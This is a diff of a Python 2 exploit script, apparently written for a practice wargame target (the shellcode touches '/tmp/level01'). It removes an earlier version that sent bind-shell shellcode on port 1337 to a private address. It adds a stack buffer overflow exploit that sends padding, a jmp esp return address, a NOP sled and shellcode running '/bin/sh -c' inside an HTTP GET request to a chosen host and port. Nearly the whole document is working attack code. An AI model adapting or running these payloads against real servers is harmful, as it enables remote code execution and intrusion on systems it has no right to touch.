@@ -1,25 +1,36 @@
+from sys import exit
 from struct import pack
-import socket
+from optparse import OptionParser
+from socket import *
 
-# Shell Bind TCP Shellcode Port 1337 - 89 bytes
-shellcode =  "\x90" * 128
-shellcode += "\x6a\x66\x58\x6a\x01\x5b\x31\xf6\x56\x53\x6a\x02\x89\xe1\xcd\x80\x5f\x97\x93\xb0\x66\x56\x66\x68\x05\x39\x66\x53\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x56\x57\x89\xe1\xcd\x80\xb0\x66\x43\x56\x56\x57\x89\xe1\xcd\x80\x59\x59\xb1\x02\x93\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x41\x89\xca\xcd\x80"
+def exploit(hostname, port):
+        junk = "A"*139
+        ret = pack("<I", 0x08049f4f)
+        esi = pack("<I", 0x9090E6FF)
+        nops = "\x90"*100
+        shellcode = ("\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f\x73\x68"
+"\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x13\x00\x00\x00\x74"
+"\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x6c\x65\x76\x65\x6c"
+"\x30\x31\x00\x57\x53\x89\xe1\xcd\x80")
 
-overflow = "A"*15
-overflow += pack("<L", 0x08049f4f); # jmp esp <- after add esp, 0x1c and pops, ret is this
-overflow += "A"*118
-overflow += "\xeb\x10" # jmp 0x12 <- this is to jump HTTP/1.1 after \x41 'nopsled'
+        s = socket(AF_INET, SOCK_STREAM)
+        try:
+                print "[*] Connecting to %s on port %s" % (hostname, port)
+                s.connect((hostname, port))
+        except:
+                print "[*] Connection error"
+                exit(1)
 
-retuaddr =  pack("<L", 0x08049a29) # add esp, 0x1c ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
+        s.send("GET " + junk + ret + esi + " HTTP/1.1" + nops + shellcode)
 
-request = "GET /" + overflow + retuaddr + " HTTP/1.1" + shellcode
 
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect(("192.168.56.105", 20001))
-s.sendall(request)
-data = s.recv(1024)
-data2 = s.recv(1024)
-s.close()
+if __name__ == "__main__":
+    parser = OptionParser("usage: %prog [options]")
+    parser.add_option("-H", "--host", dest="hostname", default="127.0.0.1",
+     type="string", help="Target to run against")
+    parser.add_option("-p", "--port", dest="portnum", default=20001,
+     type="int", help="Target port")
 
-print data
-print data2
+    (options, args) = parser.parse_args()
+
+    exploit(options.hostname, options.portnum)
